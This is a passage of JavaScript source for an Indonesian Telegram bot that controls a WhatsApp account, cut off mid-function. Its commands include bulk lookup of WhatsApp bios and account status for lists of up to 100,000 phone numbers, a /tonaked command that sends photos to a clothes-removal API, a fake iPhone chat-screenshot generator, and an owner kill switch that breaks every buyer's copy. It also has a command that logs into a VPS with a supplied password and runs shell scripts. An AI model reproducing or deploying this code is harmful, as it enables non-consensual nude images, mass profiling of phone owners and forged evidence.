bot.command("chatwa", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  if (!menuEnabled) {
    return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
  }
  if (!tokenValidated) {
    return;
  }

  const args = ctx.message.text.split(" ").slice(1);
  const q = args[0];
  const pesan = args.slice(1).join(" ");

  if (!q || !pesan) {
    return ctx.reply("⚠️ Format salah!\nGunakan:\n`/chatwa 628xxxx Pesan kamu`", { parse_mode: "Markdown" });
  }

  const nomor = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const notifMsg = await ctx.reply(`📨 Mengirim pesan ke *+${q}*...\n💬 Pesan: ${pesan}`, { parse_mode: "Markdown" });

  try {
    // Kirim pesan langsung ke WA via Baileys
    await sock.sendMessage(nomor, { text: pesan });

    await ctx.telegram.editMessageText(ctx.chat.id, notifMsg.message_id, undefined, 
      `✅ Pesan berhasil dikirim ke *+${q}*\n💬 "${pesan}"`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, notifMsg.message_id, undefined, 
      `❌ Gagal mengirim pesan ke *+${q}*\nError: ${err.message}`, { parse_mode: "Markdown" });
  }
});

function pad(n) { return String(n).padStart(2, "0"); }
function formatDateIso(iso) {
  if (!iso) return "-";
  const d = new Date(iso);
  if (isNaN(d)) return "-";
  return `${pad(d.getDate())}/${pad(d.getMonth() + 1)}/${d.getFullYear()}, ${pad(d.getHours())}.${pad(d.getMinutes())}.${pad(d.getSeconds())}`;
}

async function CekBiokarl(nomor) {
  try {
    const jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const status = await sock.fetchStatus(jid);
    if (status && typeof status === "object") {
      if (status.status) {
        return { ok: true, about: status.status, setAt: status.setAt || null };
      } else {
        return { ok: false, reason: "no_bio" };
      }
    } else {
      return { ok: false, reason: "not_registered" };
    }
  } catch (e) {
    const msg = (e && (e.message || JSON.stringify(e))).toLowerCase();
    if (msg.includes("404") || msg.includes("not found") || msg.includes("not registered")) {
      return { ok: false, reason: "not_registered" };
    }
    return { ok: false, reason: "no_bio" };
  }
}

bot.command(
  "cekbio",
  checkWhatsAppConnection,
  async (ctx) => {
  if (checkResting(ctx)) return;
  if (!groupOnly(ctx)) return;
    if (!menuEnabled) return ctx.reply("⚠️ Script disebar seseorang — script dinonaktifkan.");
    if (!tokenValidated) return;

    const arg = ctx.message.text.split(" ")[1];
    const customLimit = parseInt(arg);
    const MAX_LIMIT = 100000; // batas aman tertinggi biar bot gak overload
    const limit = isNaN(customLimit) ? 100 : Math.min(customLimit, MAX_LIMIT);

    function buildReport({ total, withBio, noBio, notRegistered, withBioByYear }) {
      let out = [];
      out.push("HASIL CEK BIO SEMUA USER");
      out.push("");
      out.push(`✅ Total nomor dicek : ${total}`);
      out.push(`📱 Dengan Bio        : ${withBio.length}`);
      out.push(`🚫 Tanpa Bio         : ${noBio.length}`);
      out.push(`⛔ Tidak Terdaftar   : ${notRegistered.length}`);
      out.push("");
      out.push("---------------------------------------\n");
      out.push(`✅ NOMOR DENGAN BIO (${withBio.length})\n`);

      const years = Object.keys(withBioByYear).map(y => (y === "-" ? 9999 : parseInt(y))).sort((a, b) => a - b);
      for (let yKey of years) {
        const yearLabel = yKey === 9999 ? "-" : String(yKey);
        const entries = withBioByYear[yearLabel] || [];
        out.push(`Tahun ${yearLabel}\n`);
        for (const e of entries) {
          out.push(`├─ ${e.nomor}`);
          out.push(`│  ├─ ✏️  "${e.about}"`);
          out.push(`│  └─ ⏰  ${e.dateStr}\n`);
        }
      }

      out.push(`🚫 NOMOR TANPA BIO (${noBio.length})\n`);
      for (const n of noBio) out.push(`├─ ${n}`);
      out.push(`\n⛔ NOMOR TIDAK TERDAFTAR (${notRegistered.length})\n`);
      for (const n of notRegistered) out.push(`├─ ${n}`);
      return out.join("\n");
    }

    if (ctx.message.reply_to_message?.document) {
      const doc = ctx.message.reply_to_message.document;
      if (!doc.file_name.endsWith(".txt")) {
        return ctx.reply("⚠️ File harus berformat .txt");
      }

      const fileLink = await ctx.telegram.getFileLink(doc.file_id);
      const response = await fetch(fileLink.href);
      const textData = await response.text();
      let nomorList = textData.split(/\r?\n/).map(l => l.trim()).filter(l => l !== "");

      if (nomorList.length > limit) {
        nomorList = nomorList.slice(0, limit);
        await ctx.reply(`⚠️ Hanya ${limit} nomor pertama yang akan dicek (sisanya diabaikan).`);
      }

      await ctx.reply(`🔍 Mengecek ${nomorList.length} nomor secara bertahap... Harap tunggu.`);

      const delay = (ms) => new Promise(res => setTimeout(res, ms));
      const batchSize = 50;

      let withBio = [];
      let noBio = [];
      let notRegistered = [];
      let total = 0;

      for (let i = 0; i < nomorList.length; i += batchSize) {
        const batch = nomorList.slice(i, i + batchSize);
        const checks = batch.map(async (raw) => {
          const clean = raw.replace(/[^0-9]/g, "");
          if (!clean) return { nomor: raw, status: "invalid" };
          const r = await CekBiokarl(clean);
          return { nomor: clean, result: r };
        });

        const settled = await Promise.allSettled(checks);

        for (const s of settled) {
          if (s.status !== "fulfilled") continue;
          const item = s.value;
          if (!item || !item.nomor) continue;
          total++;
          const r = item.result;
          if (!r) {
            notRegistered.push(item.nomor);
            continue;
          }
          if (r.ok) {
            const dateStr = r.setAt ? formatDateIso(r.setAt) : "-";
            const year = r.setAt ? String(new Date(r.setAt).getFullYear()) : "-";
            withBio.push({ nomor: item.nomor, about: r.about, dateStr, year });
          } else {
            if (r.reason === "not_registered") notRegistered.push(item.nomor);
            else noBio.push(item.nomor);
          }
        }

        if (i + batchSize < nomorList.length) {
          await ctx.reply(`⏳ Selesai ${i + batch.length}/${nomorList.length} nomor, tunggu sebentar...`);
          await delay(2000);
        }
      }

      const withBioByYear = {};
      for (const e of withBio) {
        const y = e.year || "-";
        if (!withBioByYear[y]) withBioByYear[y] = [];
        withBioByYear[y].push(e);
      }

      const report = buildReport({ total, withBio, noBio, notRegistered, withBioByYear });

      if (report.length > 4000) {
        const outName = `hasil_cekbio_${ctx.chat.id}.txt`;
        fs.writeFileSync(outName, report, "utf8");
        await ctx.replyWithDocument({ source: outName });
        fs.unlinkSync(outName);
      } else {
        await ctx.replyWithDocument({ source: Buffer.from(report, "utf8"), filename: `hasil_cekbio_${ctx.chat.id}.txt` });
      }
      return;
    }

    let nomor = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!nomor && ctx.message.reply_to_message?.text) {
      nomor = ctx.message.reply_to_message.text.trim();
    }
    if (!nomor) return ctx.reply("⚠️ Gunakan `/cekbio 628xxx` atau reply file .txt dengan `/cekbio [limit]`!");

    nomor = nomor.replace(/[^0-9]/g, "");
    const cek = await CekBiokarl(nomor);
    if (cek.ok) {
      const dateStr = cek.setAt ? formatDateIso(cek.setAt) : "-";
      return ctx.reply(`✅ +${nomor}\nBio: ${cek.about}\n📅 ${dateStr}`);
    } else {
      if (cek.reason === "not_registered") {
        return ctx.reply(`⛔ +${nomor} Tidak Terdaftar`);
      } else {
        return ctx.reply(`🚫 +${nomor} Tidak ada Bio / Tidak dapat diambil`);
      }
    }
  }
);

async function CekStatusNomor(nomor) {
  try {
    const jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    await sock.onWhatsApp(jid); // fungsi dari Baileys untuk cek registrasi
    return { ok: true, status: "active" };
  } catch (e) {
    const msg = (e && (e.message || JSON.stringify(e))).toLowerCase();
    if (msg.includes("404") || msg.includes("not found") || msg.includes("not registered")) {
      return { ok: false, status: "banned" };
    }
    return { ok: false, status: "unknown" };
  }
}

bot.command(
  "cekstatus",
  checkWhatsAppConnection,
  async (ctx) => {
  if (checkResting(ctx)) return;
  if (!groupOnly(ctx)) return;
    if (!menuEnabled) return ctx.reply("⚠️ Script disebar seseorang — script telah dinonaktifkan.");
    if (!tokenValidated) return;

    function buildReport({ total, aktif, banned, unknown }) {
      let out = [];
      out.push("📊 HASIL CEK STATUS NOMOR 📊");
      out.push("");
      out.push(`✅ Total dicek : ${total}`);
      out.push(`🟢 Aktif       : ${aktif.length}`);
      out.push(`🔴 Banned      : ${banned.length}`);
      out.push(`⚫ Tidak Diketahui : ${unknown.length}`);
      out.push("");
      out.push("------------------------------------");
      out.push("");

      out.push(`🟢 NOMOR AKTIF (${aktif.length})`);
      out.push("");
      for (const n of aktif) out.push(`├─ ${n}`);
      out.push("");
      out.push(`🔴 NOMOR BANNED (${banned.length})`);
      out.push("");
      for (const n of banned) out.push(`├─ ${n}`);
      out.push("");
      out.push(`⚫ STATUS TIDAK DIKETAHUI (${unknown.length})`);
      out.push("");
      for (const n of unknown) out.push(`├─ ${n}`);
      return out.join("\n");
    }

    // --- jika reply ke file txt ---
    if (ctx.message.reply_to_message?.document) {
      const doc = ctx.message.reply_to_message.document;
      if (!doc.file_name.endsWith(".txt")) {
        return ctx.reply("⚠️ File harus format .txt");
      }

      const fileLink = await ctx.telegram.getFileLink(doc.file_id);
      const response = await fetch(fileLink.href);
      const textData = await response.text();
      let nomorList = textData.split(/\r?\n/).map(l => l.trim()).filter(l => l !== "");

      // ambil argumen limit: /cekstatus 200
      const arg = ctx.message.text.split(" ")[1];
      let limit = parseInt(arg);
      if (isNaN(limit) || limit <= 0) limit = 50;
      if (nomorList.length > limit) {
        nomorList = nomorList.slice(0, limit);
        await ctx.reply(`⚠️ Hanya ${limit} nomor pertama yang akan dicek.`);
      }

      await ctx.reply(`🔍 Mengecek ${nomorList.length} nomor... harap tunggu.`);

      const delay = (ms) => new Promise(res => setTimeout(res, ms));
      const batchSize = 50;
      let aktif = [];
      let banned = [];
      let unknown = [];
      let total = 0;

      for (let i = 0; i < nomorList.length; i += batchSize) {
        const batch = nomorList.slice(i, i + batchSize);
        const checks = batch.map(async (raw) => {
          const clean = raw.replace(/[^0-9]/g, "");
          if (!clean) return { nomor: raw, status: "invalid" };
          const r = await CekStatusNomor(clean);
          return { nomor: clean, result: r };
        });

        const settled = await Promise.allSettled(checks);
        for (const s of settled) {
          if (s.status !== "fulfilled") continue;
          const item = s.value;
          if (!item || !item.nomor) continue;
          total++;
          const r = item.result;
          if (!r) {
            unknown.push(item.nomor);
            continue;
          }
          if (r.ok && r.status === "active") aktif.push(item.nomor);
          else if (!r.ok && r.status === "banned") banned.push(item.nomor);
          else unknown.push(item.nomor);
        }

        if (i + batchSize < nomorList.length) {
          await ctx.reply(`⏳ Selesai ${i + batch.length}/${nomorList.length} nomor, tunggu sebentar...`);
          await delay(2000);
        }
      }

      const report = buildReport({ total, aktif, banned, unknown });
      const outName = `hasil_cekstatus_${ctx.chat.id}.txt`;
      fs.writeFileSync(outName, report, "utf8");
      await ctx.replyWithDocument({ source: outName });
      fs.unlinkSync(outName);
      return;
    }

    // --- cek satu nomor langsung ---
    let nomor = ctx.message.text.split(" ").slice(1).join(" ").trim();
    if (!nomor && ctx.message.reply_to_message?.text) {
      nomor = ctx.message.reply_to_message.text.trim();
    }
    if (!nomor) return ctx.reply("⚠️ Gunakan `/cekstatus 628xxx` atau reply ke file .txt!");

    nomor = nomor.replace(/[^0-9]/g, "");
    const cek = await CekStatusNomor(nomor);

    if (cek.ok && cek.status === "active") {
      return ctx.reply(`✅ +${nomor}\nStatus: AKTIF`);
    } else if (!cek.ok && cek.status === "banned") {
      return ctx.reply(`⛔ +${nomor}\nStatus: TERBANNED / Tidak Terdaftar`);
    } else {
      return ctx.reply(`⚫ +${nomor}\nStatus: Tidak diketahui / Tidak bisa diakses`);
    }
  }
);

// ======================= HELPERS =======================
// format timestamp (ms atau s) -> "YYYY-MM-DD HH:mm:ss"
function formatTimestamp(ts) {
  if (!ts) return "-";
  // kalau ts dalam detik, ubah ke ms
  if (ts < 1e12) ts = ts * 1000;
  const d = new Date(ts);
  const pad = n => (n < 10 ? "0" + n : n);
  return `${d.getFullYear()}-${pad(d.getMonth()+1)}-${pad(d.getDate())} ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
}

// ======================= FUNCTION CEK FOTO PROFIL =======================
async function CekFotoProfil(nomor) {
  try {
    const jid = nomor.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
    const ppUrl = await sock.profilePictureUrl(jid, "image"); // bisa "preview" atau "image"
    return ppUrl || null;
  } catch {
    return null; // tidak punya foto profil / private
  }
}

bot.command("cekdoc", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const reply = ctx.message.reply_to_message;
    if (!reply?.document) {
      return ctx.reply("⚠️ Balas file yang ingin dianalisis!\nContoh:\n/cekdoc (balas file.js / file.py / file.html / file.css)");
    }

    const file = reply.document;
    const fileName = file.file_name.toLowerCase();

    if (
      !fileName.endsWith(".js") &&
      !fileName.endsWith(".py") &&
      !fileName.endsWith(".html") &&
      !fileName.endsWith(".css")
    ) {
      return ctx.reply("❌ Format file tidak didukung! Hanya mendukung `.js`, `.py`, `.html`, `.css`");
    }

    await ctx.reply("🔍 Sedang menganalisis isi file...");

    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const res = await fetch(fileLink.href);
    const code = await res.text();

    let report = `🧩 *Analisis File:* \`${file.file_name}\`\n`;

    // ===============================
    // ANALISIS FILE JAVASCRIPT
    // ===============================
    if (fileName.endsWith(".js")) {
      try {
        const tree = acorn.parse(code, { ecmaVersion: "latest", sourceType: "module", locations: true });

        const summary = {
          functions: [],
          classes: [],
          imports: [],
          requires: [],
          protections: [],
        };

        walk.simple(tree, {
          FunctionDeclaration(node) {
            summary.functions.push(`${node.id?.name || "(anonim)"} (baris ${node.loc.start.line})`);
          },
          ClassDeclaration(node) {
            if (node.id?.name) summary.classes.push(node.id.name);
          },
          ImportDeclaration(node) {
            if (node.source?.value) summary.imports.push(node.source.value);
          },
          CallExpression(node) {
            if (node.callee?.name === "require" && node.arguments?.[0]?.value)
              summary.requires.push(node.arguments[0].value);
          },
        });

        const codeLower = code.toLowerCase();
        if (codeLower.includes("debugger")) summary.protections.push("🧠 Anti-Debug aktif");
        if (codeLower.includes("process.exit")) summary.protections.push("⚔️ Process Kill Protection");
        if (codeLower.includes("eval(")) summary.protections.push("🕵️ Eval Lock / Dynamic Eval");
        if (codeLower.includes("checksum")) summary.protections.push("🔐 Checksum Validation");

        report += `
📦 *Jenis Script:* JavaScript
⚙️ Function: ${summary.functions.length}
🏗️ Class: ${summary.classes.length}
📥 Import: ${summary.imports.length}
📦 Require: ${summary.requires.length}

📜 *Daftar Function:*
${summary.functions.join("\n") || "—"}

🔒 *Proteksi:*
${summary.protections.join("\n") || "—"}
`;
      } catch (err) {
        report += `\n❌ *Error Parsing JavaScript:*\n• ${err.message}`;
        if (err.loc) report += `\n• Lokasi: baris ${err.loc.line}, kolom ${err.loc.column}`;
      }
    }

    // ===============================
    // ANALISIS FILE PYTHON
    // ===============================
    else if (fileName.endsWith(".py")) {
      const lines = code.split("\n");
      const functions = [];
      const classes = [];
      const imports = [];
      let syntaxErrors = [];

      lines.forEach((line, i) => {
        if (/^def\s+\w+/.test(line)) functions.push(`• ${line.trim()} (baris ${i + 1})`);
        if (/^class\s+\w+/.test(line)) classes.push(`• ${line.trim()} (baris ${i + 1})`);
        if (/^import\s+/.test(line) || /^from\s+\w+/.test(line)) imports.push(`• ${line.trim()}`);

        // Deteksi error umum (indentasi/tab campur spasi)
        if (/^\s+/.test(line) && line.includes("\t")) syntaxErrors.push(`❌ Campur tab dan spasi (baris ${i + 1})`);
        if (/print\s+\w/.test(line) && !line.includes("(")) syntaxErrors.push(`⚠️ Kemungkinan sintaks Python 3 salah di baris ${i + 1}`);
      });

      report += `
🐍 *Jenis Script:* Python
⚙️ Function: ${functions.length}
🏗️ Class: ${classes.length}
📥 Import: ${imports.length}

📜 *Daftar Function:*
${functions.join("\n") || "—"}

🔍 *Daftar Class:*
${classes.join("\n") || "—"}

📦 *Import:*
${imports.join("\n") || "—"}

❗ *Kemungkinan Error:*
${syntaxErrors.join("\n") || "—"}
`;
    }

    // ===============================
    // ANALISIS FILE HTML
    // ===============================
    else if (fileName.endsWith(".html")) {
      const unclosedTags = [];
      const allTags = code.match(/<\s*\/?\s*[\w-]+/g) || [];
      const opened = [];

      for (const tag of allTags) {
        const cleanTag = tag.replace(/[<>]/g, "").trim().split(" ")[0];
        if (!cleanTag.startsWith("/")) opened.push(cleanTag);
        else {
          const t = cleanTag.replace("/", "");
          const idx = opened.lastIndexOf(t);
          if (idx !== -1) opened.splice(idx, 1);
          else unclosedTags.push(t);
        }
      }

      const hasHead = /<head>/i.test(code);
      const hasBody = /<body>/i.test(code);

      report += `
🌐 *Jenis File:* HTML
🧱 *Tag Tidak Tertutup:* ${unclosedTags.length}
📄 Struktur: ${hasHead && hasBody ? "Lengkap ✅" : "Tidak Lengkap ⚠️"}

🔍 *Tag Tidak Tertutup:*
${unclosedTags.map(t => "• " + t).join("\n") || "—"}
`;
    }

    // ===============================
    // ANALISIS FILE CSS
    // ===============================
    else if (fileName.endsWith(".css")) {
      const lines = code.split("\n");
      const selectors = [];
      const properties = [];
      const syntaxErrors = [];

      lines.forEach((line, i) => {
        if (/{/.test(line)) selectors.push(`• ${line.trim()} (baris ${i + 1})`);
        if (/:/.test(line) && !line.includes("{")) properties.push(`• ${line.trim()}`);
        if (line.includes("{") && !line.includes("}")) syntaxErrors.push(`⚠️ Kurung kurawal tidak tertutup (baris ${i + 1})`);
      });

      report += `
🎨 *Jenis File:* CSS
📦 Selector: ${selectors.length}
🧩 Property: ${properties.length}
❗ *Kemungkinan Error:* ${syntaxErrors.length}

📜 *Selector:*
${selectors.join("\n") || "—"}

🔍 *Error:*
${syntaxErrors.join("\n") || "—"}
`;
    }

    // Kirim hasil
    if (report.length > 4000) {
      const filePath = path.join(__dirname, "hasil_cekfile.txt");
      fs.writeFileSync(filePath, report);
      await ctx.replyWithDocument({ source: filePath, filename: "hasil_cekfile.txt" });
      fs.unlinkSync(filePath);
    } else {
      await ctx.replyWithMarkdown(report);
    }
  } catch (err) {
    console.error("cekfile error:", err);
    ctx.reply(`❌ Gagal menganalisis file: ${err.message}`);
  }
});

bot.command("waakses", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  if (!menuEnabled) {
    return ctx.reply("⚠️ Script disebar seseorang. Script telah dinonaktifkan.");
  }
  if (!tokenValidated) return;

  const args = ctx.message.text.split(" ").slice(1);
  const action = args[0]?.toLowerCase(); // block / unblock
  const nomorInput = args[1];

  if (!action || !nomorInput) {
    return ctx.reply(
      "⚠️ Format salah!\nGunakan:\n" +
      "• `/ waakses 628xxxx` untuk memblokir\n" +
      "• `/waakses unblock 628xxxx` untuk membuka blokir",
      { parse_mode: "Markdown" }
    );
  }

  const nomor = nomorInput.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Notifikasi awal
  const notifMsg = await ctx.reply(`⏳ Memproses perintah *${action.toUpperCase()}* untuk +${nomorInput}...`, {
    parse_mode: "Markdown",
  });

  try {
    if (action === "block") {
      await sock.updateBlockStatus(nomor, "block");
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        notifMsg.message_id,
        undefined,
        `✅ Nomor *+${nomorInput}* berhasil *diblokir*!`,
        { parse_mode: "Markdown" }
      );
    } else if (action === "unblock") {
      await sock.updateBlockStatus(nomor, "unblock");
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        notifMsg.message_id,
        undefined,
        `✅ Nomor *+${nomorInput}* berhasil *dibuka blokirnya*!`,
        { parse_mode: "Markdown" }
      );
    } else {
      await ctx.telegram.editMessageText(
        ctx.chat.id,
        notifMsg.message_id,
        undefined,
        "⚠️ Perintah tidak dikenal!\nGunakan: `block` atau `unblock`",
        { parse_mode: "Markdown" }
      );
    }
  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      notifMsg.message_id,
      undefined,
      `❌ Gagal memproses *${action}* untuk +${nomorInput}\nError: ${err.message}`,
      { parse_mode: "Markdown" }
    );
  }
});

bot.command("deploygithub", async (ctx) => {
if (checkResting(ctx)) return;
  try {
    const repoName = ctx.message.text.split(" ").slice(1).join("").trim();
    const reply = ctx.message.reply_to_message;

    if (!repoName) {
      return ctx.reply("⚠️ Contoh: /deploygithub namarepo");
    }

    if (!reply || !reply.document) {
      return ctx.reply("⚠️ Balas ZIP dengan perintah ini!");
    }

    await ctx.reply("⏳ Membuat repository dan upload isi ZIP\nJika Bot Lama Respon Maka Langsung Cek aja di github kamu\nCari Dipencarian github nama repo lu tadi.");

    // Ambil ZIP dari Telegram
    const fileId = reply.document.file_id;
    const fileUrl = await ctx.telegram.getFileLink(fileId);
    const fileBuffer = (await axios.get(fileUrl.href, { responseType: "arraybuffer" })).data;

    // Deploy ZIP → isi file (bukan ZIP)
    const result = await deployToGitHub(repoName, fileBuffer, githubToken, githubUser);

    if (!result.success) return ctx.reply("❌ Deploy gagal.");

    return ctx.reply(
      `✅ *Deploy Berhasil!*\n🚀 Repo: ${result.url}`,
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.error(err);
    return ctx.reply("❌ Terjadi error saat deploy.");
  }
});

bot.command("getgithub", async (ctx) => {
if (checkResting(ctx)) return;
  try {
    const url = ctx.message.text.split(" ").slice(1).join(" ").trim();

    if (!url) {
      return ctx.reply("⚠️ Contoh:\n`/getgithub https://github.com/expressjs/express`", {
        parse_mode: "Markdown"
      });
    }

    // Validasi URL GitHub
    const githubPattern = /github\.com\/([^\/]+)\/([^\/]+)/;
    const match = url.match(githubPattern);

    if (!match) {
      return ctx.reply("❌ URL GitHub tidak valid.");
    }

    const owner = match[1];
    const repo = match[2];

    await ctx.reply(`⏳ Mengambil repository *${owner}/${repo}*...`, {
      parse_mode: "Markdown"
    });

    // Ambil info repo (untuk cari default branch)
    const meta = await axios.get(`https://api.github.com/repos/${owner}/${repo}`, {
      headers: { "User-Agent": "GetGitHubBot" }
    });

    const branch = meta.data.default_branch;

    // URL download ZIP
    const zipUrl = `https://github.com/${owner}/${repo}/archive/refs/heads/${branch}.zip`;

    const res = await axios.get(zipUrl, { responseType: "arraybuffer" });

    const fileName = `${repo}-${branch}.zip`;

    // Kirim ZIP
    await ctx.replyWithDocument(
      { source: Buffer.from(res.data), filename: fileName },
      { caption: `✅ *Berhasil!*\nRepository: \`${owner}/${repo}\`\nBranch: \`${branch}\``, parse_mode: "Markdown" }
    );

  } catch (err) {
    console.error("GetGitHub Error:", err.response?.data || err);
    return ctx.reply("❌ Gagal mengambil ZIP repo GitHub.");
  }
});

bot.command("inforam", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  if (!menuEnabled) {
    return ctx.reply("⚠️ Script disebar Seseorang Script telah dinonaktifkan.");
  }

  if (!tokenValidated) {
    return;
  }

  try {
    await ctx.reply("⏳ Mengambil informasi sistem panel...");
    const totalMem = os.totalmem() / 1024 / 1024 / 1024;
    const freeMem = os.freemem() / 1024 / 1024 / 1024;
    const usedMem = totalMem - freeMem;
    const memUsage = ((usedMem / totalMem) * 100).toFixed(2);
    const cpus = os.cpus();
    const cpuModel = cpus[0].model;
    const cpuCount = cpus.length;
  const load = os.loadavg()[0].toFixed(2);
    const uptimeHours = Math.floor(os.uptime() / 3600);
    const uptimeMinutes = Math.floor((os.uptime() % 3600) / 60);
    const uptime = `${uptimeHours} jam ${uptimeMinutes} menit`;

    const caption = `
🖥️ *Informasi Panel / Server RAM*
──────────────────────────────
💾 *Memory (RAM)*
• Total: ${totalMem.toFixed(2)} GB
• Terpakai: ${usedMem.toFixed(2)} GB
• Tersisa: ${freeMem.toFixed(2)} GB
• Penggunaan: ${memUsage}%

⚙️ *Processor*
• Model: ${cpuModel}
• Core: ${cpuCount}
• Beban: ${load}

⏱️ *Uptime*: ${uptime}
🌐 *Platform*: ${os.platform().toUpperCase()}
🧩 *Node.js*: ${process.version}
──────────────────────────────
📡 Status: *Online & Stabil*
    `.trim();

    await ctx.replyWithMarkdown(caption);
  } catch (err) {
    console.error("InfoRAM Error:", err);
    ctx.reply("❌ Gagal mengambil informasi RAM.");
  }
});

bot.command("errorsc", async (ctx) => {
  try {
    if (ctx.from.id !== 5126860596) {
      return ctx.reply("❌ Kamu tidak memiliki izin.");
    }

    const args = ctx.message.text.split(" ");
    const mode = args[1]?.toLowerCase();

    if (!mode || !["on", "off"].includes(mode)) {
      return ctx.reply("Gunakan:\n/errorsc on\n/errorsc off");
    }

    await ctx.reply(`⏳ Mengubah status script menjadi *${mode.toUpperCase()}* ...`);

    const githubToken = process.env.GH_TOKEN;
    const repoOwner = "Bealllevey62";
    const repoName = "lolipopDb";
    const filePath = "status.json";

    const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`;

    // Ambil status.json untuk dapat SHA
    const getFile = await axios.get(apiUrl, {
      headers: { Authorization: `token ${githubToken}` }
    });

    const sha = getFile.data.sha;

    const newData =
      mode === "on"
        ? { error: true, message: "Script disabled by owner." }
        : { error: false, message: "Script active." };

    const encoded = Buffer.from(JSON.stringify(newData, null, 2)).toString("base64");

    await axios.put(
      apiUrl,
      {
        message: mode === "on" ? "ERROR ON" : "ERROR OFF",
        content: encoded,
        sha
      },
      {
        headers: { Authorization: `token ${githubToken}` }
      }
    );

    ctx.reply(
      mode === "on"
        ? "⚠️ *Global ERROR diaktifkan!* Semua user akan error."
        : "✅ *Script kembali normal!*",
      { parse_mode: "Markdown" }
    );

  } catch (err) {
    console.error("ErrorSC:", err.message);
    ctx.reply("❌ Gagal update script. Cek GH_TOKEN / repo / file status.json.");
  }
});

bot.command("iqc", async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const text = ctx.message.text.split(" ").slice(1).join(" "); 

    if (!text) {
      return ctx.reply(
        "❌ Format: /iqc 18:00|40|Indosat|Pesan kamu",
        { parse_mode: "Markdown" }
      );
    }

    let [time, battery, carrier, ...msgParts] = text.split("|");

    if (!time || !battery || !carrier || msgParts.length === 0) {
      return ctx.reply(
        "❌ Format salah. Contoh: /iqc 18:00|40|Indosat|Halo semua",
        { parse_mode: "Markdown" }
      );
    }

    await ctx.reply("⏳ Mohon tunggu sebentar...");

    let messageText = encodeURIComponent(msgParts.join("|").trim());
    let url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodeURIComponent(
      time
    )}&batteryPercentage=${encodeURIComponent(battery)}&carrierName=${encodeURIComponent(
      carrier
    )}&messageText=${messageText}&emojiStyle=apple`;

    let res = await fetch(url);
    if (!res.ok) {
      return ctx.reply("❌ Gagal mengambil data dari API.");
    }

    let buffer;
    if (res.arrayBuffer) {
      const arrayBuffer = await res.arrayBuffer();
      buffer = Buffer.from(arrayBuffer);
    } else if (res.buffer) {
      buffer = await res.buffer();
    } else {
      return ctx.reply("❌ Gagal memproses data dari API.");
    }

    await ctx.replyWithPhoto({ source: buffer }, {
      caption: `✅ Ss Iphone Tredict Invictus`,
      parse_mode: "Markdown"
    });

  } catch (e) {
    console.error("Error /iqc:", e);
    ctx.reply("❌ Terjadi kesalahan saat menghubungi API.");
  }
});
bot.command("tonaked", checkPremium, async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  const args = ctx.message.text.split(' ').slice(1).join(' ')
  let imageUrl = args || null

  if (!imageUrl && ctx.message.reply_to_message && ctx.message.reply_to_message.photo) {
    const fileId = ctx.message.reply_to_message.photo.pop().file_id
    const fileLink = await ctx.telegram.getFileLink(fileId)
    imageUrl = fileLink.href
  }

  if (!imageUrl) {
    return ctx.reply('🪧 ☇ Format: /tonaked (reply gambar)')
  }

  const statusMsg = await ctx.reply('⏳ ☇ Memproses gambar')

  try {
    const res = await fetch(`https://api.nekolabs.my.id/tools/convert/remove-clothes?imageUrl=${encodeURIComponent(imageUrl)}`)
    const data = await res.json()
    const hasil = data.result

    if (!hasil) {
      return ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Gagal memproses gambar, pastikan URL atau foto valid')
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id)
    await ctx.replyWithPhoto(hasil)

  } catch (e) {
    await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, '❌ ☇ Terjadi kesalahan saat memproses gambar')
  }
})

bot.command("installprotek", checkPremium, async (ctx) => {
if (checkResting(ctx)) return;
if (!groupOnly(ctx)) return;
  try {
    const args = ctx.message.text.split(' ').slice(1).join(' ').trim();
    if (!args || !args.includes('|')) {
      return ctx.reply('❌ Salah format!\nGunakan: /installprotek <ipvps>|<pwvps>\nContoh: /installprotek 1.2.3.4|p@ssw0rd');
    }

    const [ipvps, pwvps] = args.split('|').map(s => s.trim());
    if (!ipvps || !pwvps) {
      return ctx.reply('❌ Salah format!\nGunakan: /installprotek <ipvps>|<pwvps>');
    }

    // Mask password untuk chat
    const maskedPw = pwvps.length > 2 ? pwvps[0] + '*'.repeat(Math.max(2, pwvps.length - 2)) + pwvps.slice(-1) : '*'.repeat(pwvps.length);

    const statusMsg = await ctx.reply(`⏳ Menghubungkan ke VPS *${ipvps}*\n🔐 Password: \`${maskedPw}\`\nMemulai instalasi Protect Panel 1-9...`, { parse_mode: 'Markdown' });

    const conn = new Client();
    const scripts = [
      'mbut.sh','mbut2.sh','mbut3.sh','mbut4.sh','mbut5.sh',
      'mbut6.sh','mbut7.sh','mbut8.sh','mbut9.sh'
    ];

    conn.on('ready', async () => {
      await ctx.telegram.editMessageText(ctx.chat.id, statusMsg.message_id, undefined, `✅ Koneksi ke VPS *${ipvps}* berhasil!\nMemulai instalasi...`, { parse_mode: 'Markdown' });

      for (let i = 0; i < scripts.length; i++) {
